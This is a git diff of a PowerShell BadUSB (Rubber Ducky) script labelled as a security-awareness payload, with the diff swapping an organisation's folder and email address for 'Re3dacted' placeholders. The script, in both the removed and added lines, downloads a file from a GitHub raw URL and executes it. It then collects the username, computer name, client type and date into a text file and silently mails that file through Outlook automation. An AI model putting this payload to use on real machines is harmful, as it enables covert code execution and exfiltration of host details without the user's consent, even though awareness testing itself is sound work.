@@ -1,5 +1,5 @@
-mkdir C:\L1dl;
-cd C:\L1dl;
+mkdir C:\Re3dacted;
+cd C:\Re3dacted;
 $rand = (Get-Random -Maximum 4 ) + 1
 wget "https://raw.githubusercontent.com/balazsbanyasz/work/main/hoff$rand.png" -o "hoff$rand.png";
 & ".\hoff$rand.png";
@@ -60,4 +60,4 @@ public class Params
 };
 
 Set-WallPaper -Image "C:\L1dl\hoff$rand.png" -Style Fit;
-$name = whoami; $name = $name.substring(3); echo "#happyhoff | BadUSBAwarenessV1.3" >> C:\L1dl\$name.txt; whoami >> C:\L1dl\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\L1dl\$name.txt; $env:CLIENTTYPE >> C:\L1dl\$name.txt; date >> C:\L1dl\$name.txt; $outlook = new-object -comobject outlook.application; $email = $outlook.CreateItem(0); $email.To = "iso@lidl.hu"; $email.Sensitivity = 3; $email.Subject = "$name rubberducky!"; $date = date; $email.Body = "$name $date bedugta a rubber duckyt a gépébe"; $email.Attachments.add("C:\L1dl\$name.txt"); $email.Send();
+$name = whoami; $name = $name.substring(3); echo "#happyhoff | BadUSBAwarenessV1.3" >> C:\Re3dacted\$name.txt; whoami >> C:\Re3dacted\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\Re3dacted\$name.txt; $env:CLIENTTYPE >> C:\Re3dacted\$name.txt; date >> C:\Re3dacted\$name.txt; $outlook = new-object -comobject outlook.application; $email = $outlook.CreateItem(0); $email.To = "Re3dacted@Re3dacted.hu"; $email.Sensitivity = 3; $email.Subject = "$name rubberducky!"; $date = date; $email.Body = "$name $date bedugta a rubber duckyt a gépébe"; $email.Attachments.add("C:\Re3dacted\$name.txt"); $email.Send();
